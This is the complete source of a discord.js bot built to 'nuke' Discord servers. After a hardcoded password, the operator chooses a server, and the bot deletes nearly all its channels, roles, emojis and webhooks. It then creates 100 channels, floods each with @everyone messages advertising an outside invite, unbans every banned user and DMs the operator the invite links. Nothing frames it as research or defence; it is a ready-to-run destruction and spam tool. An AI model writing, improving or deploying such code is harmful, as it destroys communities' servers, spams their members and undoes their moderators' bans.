const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType,
  PermissionsBitField
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// Configuration
const MAIN_PASSWORD = 'flower2017';
const INVITE_LINK = 'discord.gg/fameunlocked'; // Main invite to spam
const MAX_CHANNELS = 100; // Number of channels to create
const SPAM_DELAY = 200; // Delay between spam messages in ms

// Express server
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// Client setup
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// Ready event
client.once('ready', () => {
  console.log(`${client.user.tag} is online!`);
});

// Message events
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  if (message.content.trim().toLowerCase() === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 REMOTE NUKE')
      .setDescription('Enter password to begin nuke sequence.')
      .setFooter({ text: 'Click below to proceed' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`fb_start_${message.author.id}`)
        .setLabel('Begin Nuke Sequence')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// Interaction events
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];
    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });

    if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`fb_modal_${userId}`)
        .setTitle('Authentication Required');
      
      modal.addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Enter Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        )
      );
      
      return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

      const servers = client.guilds.cache.map(g => ({
        label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
        value: g.id,
        description: `${g.memberCount} members`
      }));

      const menu = new StringSelectMenuBuilder()
        .setCustomId(`fb_server_${userId}`)
        .setPlaceholder('Choose server to NUKE')
        .addOptions(servers);
      
      const row = new ActionRowBuilder().addComponents(menu);

      await interaction.reply({ 
        content: '✅ Password accepted! Select target server:', 
        components: [row],
        ephemeral: true 
      });
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
      await interaction.deferUpdate();

      const guildId = interaction.values[0];
      const guild = client.guilds.cache.get(guildId);

      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });

      const user = interaction.user;

      // Verify bot has admin permissions
      const member = await guild.members.fetch(client.user.id);
      if (!member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.followUp({
          content: '❌ Bot lacks Administrator permissions.',
          ephemeral: true
        });
      }

      await interaction.followUp({
        content: `🔴 **RAIDING ${guild.name}** - Initiating nuke sequence...`,
        ephemeral: true
      });

      try {
        // Initial cleanup
        await deleteAllChannels(guild);
        await deleteAllRoles(guild);
        await deleteAllEmojis(guild);
        await deleteAllWebhooks(guild);

        // Create spam channels
        const spamPromises = [];
        for (let i = 0; i < MAX_CHANNELS; i++) {
          spamPromises.push(createSpamChannel(guild, user));
          
          // Throttle requests
          if (i % 10 === 0) {
            await new Promise(resolve => setTimeout(resolve, 500));
          }
        }
        
        // Wait for all channels to be created
        await Promise.all(spamPromises);

        // Auto-unban users after raid
        setTimeout(async () => {
          try {
            const bans = await guild.bans.fetch();
            let successCount = 0;
            
            for (const ban of bans.values()) {
              try {
                await guild.members.unban(ban.user.id);
                successCount++;
              } catch (err) {
                console.error(`Failed to unban ${ban.user.tag}:`, err);
              }
            }
            
            await user.send(`✅ Unbanned ${successCount}/${bans.size} users from ${guild.name}`);
          } catch (err) {
            console.error('Failed to unban users:', err);
          }
        }, 10000); // Wait 10 seconds before unban

        await interaction.followUp({
          content: `✅ **${guild.name}** nuked successfully!\nCheck your DMs for invite links.`,
          ephemeral: true
        });
      } catch (err) {
        console.error('Nuke error:', err);
        await interaction.followUp({
          content: '⚠️ Nuke partially failed. Some actions may have completed.',
          ephemeral: true
        });
      }
    }
  } catch (error) {
    console.error('Interaction error:', error);
  }
});

// Helper functions
async function deleteAllChannels(guild) {
  const channels = guild.channels.cache.filter(c => 
    !c.name.includes('general') && 
    !c.name.includes('welcome')
  );
  
  const deletePromises = [];
  for (const channel of channels.values()) {
    deletePromises.push(channel.delete());
    
    // Throttle to avoid rate limits
    if (deletePromises.length % 20 === 0) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  return Promise.all(deletePromises);
}

async function deleteAllRoles(guild) {
  const roles = guild.roles.cache.filter(r => 
    !r.name.includes('Owner') && 
    !r.name.includes('Administrator')
  );
  
  const deletePromises = [];
  for (const role of roles.values()) {
    deletePromises.push(role.delete());
    
    // Throttle to avoid rate limits
    if (deletePromises.length % 20 === 0) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  return Promise.all(deletePromises);
}

async function deleteAllEmojis(guild) {
  const emojis = guild.emojis.cache;
  const deletePromises = [];
  
  for (const emoji of emojis.values()) {
    deletePromises.push(emoji.delete());
    
    // Throttle to avoid rate limits
    if (deletePromises.length % 20 === 0) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  return Promise.all(deletePromises);
}

async function deleteAllWebhooks(guild) {
  const webhooks = await guild.fetchWebhooks();
  const deletePromises = [];
  
  for (const webhook of webhooks.values()) {
    deletePromises.push(webhook.delete());
    
    // Throttle to avoid rate limits
    if (deletePromises.length % 20 === 0) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  return Promise.all(deletePromises);
}

async function createSpamChannel(guild, user) {
  try {
    const channel = await guild.channels.create({
      name: 'fame-nuked',
      type: ChannelType.GuildText
    });

    // Create invite
    const invite = await channel.createInvite({
      maxAge: 0,
      maxUses: 0
    });

    // Spam invite in channel
    let messageCount = 0;
    const interval = setInterval(async () => {
      try {
        await channel.send(`@everyone\n${INVITE_LINK}`);
        messageCount++;
        
        // Stop after 100 messages
        if (messageCount >= 100) {
          clearInterval(interval);
        }
      } catch (err) {
        console.error('Spam error:', err);
        clearInterval(interval);
      }
    }, SPAM_DELAY);

    // DM user with invite
    await user.send(`✅ Created spam channel: https://discord.gg/${invite.code}`);
    
    return channel;
  } catch (err) {
    console.error('Channel creation error:', err);
    return null;
  }
}

client.login(process.env.TOKEN);
